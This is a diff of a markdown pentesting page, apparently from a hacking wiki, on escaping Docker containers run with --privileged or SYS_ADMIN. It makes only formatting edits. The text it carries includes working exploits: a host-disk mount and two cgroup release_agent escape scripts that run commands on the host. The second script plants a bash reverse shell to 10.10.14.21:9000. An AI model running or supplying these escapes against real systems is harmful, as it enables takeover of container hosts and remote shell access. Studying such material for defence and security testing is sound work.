@@ -40,9 +40,9 @@ In the following page you can **learn more about linux capabilities** and how to
 
 ## `--privileged` flag
 
-The --privileged flag allows the container to have access to the host devices. 
+The --privileged flag allows the container to have access to the host devices.
 
-### I own Root 
+### I own Root
 
 Well configured docker containers won't allow command like **fdisk -l**. However on missconfigured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.
 
@@ -50,20 +50,18 @@ Well configured docker containers won't allow command like **fdisk -l**. However
 
 So to take over the host machine, it is trivial:
 
-```sh
+```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
- 
- And voilà ! You can now acces the filesystem of the host because it is mounted in the /mnt/hole folder.
 
+And voilà ! You can now acces the filesystem of the host because it is mounted in the /mnt/hole folder.
 
 {% code title="Initial PoC" %}
-
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
- 
+
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
 t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -75,16 +73,14 @@ sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
 {% endcode %}
 
-
 {% code title="Second PoC" %}
-
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
- 
+
 # In the container
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
- 
+
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
@@ -99,13 +95,13 @@ echo '#!/bin/bash' > /cmd
 echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
 chmod a+x /cmd
 #===================================
- 
+
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 head /output
 ```
 {% endcode %}
 
- The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
+The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
 
 In fact, `--privileged` provides far more permissions than needed to escape a docker container via this method. In reality, the “only” requirements are:
 
